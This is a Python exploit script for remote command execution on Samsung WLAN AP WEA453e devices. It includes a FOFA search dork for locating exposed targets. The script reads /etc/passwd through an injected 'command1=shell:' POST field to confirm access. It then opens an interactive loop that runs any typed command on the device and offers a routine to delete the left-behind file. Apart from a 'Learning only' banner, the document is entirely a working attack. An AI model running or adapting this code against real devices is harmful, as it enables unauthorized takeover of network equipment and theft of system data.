#!/usr/bin/python3
# fofa dork: title="Samsung WLAN AP"
# Author SD

import sys
import requests
import time
from urllib3.exceptions import InsecureRequestWarning


def Checking():
    try:
        Url = target + "(download)/tmp/hello.txt"
        CkData = "command1=shell:cat /etc/passwd| dd of=/tmp/hello.txt"
        response = requests.post(url=Url, data=CkData, verify=False, timeout=20)
        if (response.status_code == 200 and 'root:' in response.text):
            return True
        else:
            return False
    except Exception as e:
        # print("checking")
        print("[-] Server Error")


def Exploit():
    Url = target + "(download)/tmp/hello.txt"
    while Checking() is True:
        try:
            command = input("# ")
            if (command == 'exit'):
                sys.exit()
            data = "command1=shell:" + command + "| dd of=/tmp/hello.txt"
            response = requests.post(url=Url, data=data, verify=False, timeout=20)
            if (response.text == None):
                print("[!] Server reply nothing")
            else:
                print(response.text)
        except Exception as e:
            print("[-] Server not suport this command")


def Clean():
    Url = target + "(download)/tmp/hello.txt"
    while Checking() is True:
        try:
            CleanData = "command1=shell:busybox rm -f /tmp/hello.txt| dd of=/tmp/hello.txt"
            response = requests.post(url=Url, data=CleanData, verify=False, timeout=10)
            if (response.status_code == 200):
                print("[+] Clean target successfully")
                sys.exit()
            else:
                print("[-] Clean Failed")
        except Exception as e:
            print("[-] Server error")


if __name__ == '__main__':
    if (len(sys.argv) < 2):
        print("|-----------------------------------------------------------------------------------|")
        print("|                                WLAN-AP-WEA453e Rce                                |")
        print("|                       UseAge: python3 exploit.py target                           |")
        print("|                   Example: python3 exploit.py https://192.168.1.2/                |")
        print("|                 Clean target: python3 exploit.py https://192.168.1.2/ clean       |")
        print("|                                [!] Learning only                                  |")
        print("|___________________________________________________________________________________|")
        sys.exit()
    target = sys.argv[1]
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    if (len(sys.argv) == 3):
        module = sys.argv[2]
        if (module == 'clean'):
            Clean()
        else:
            print("[-] module error")
    Exploit()
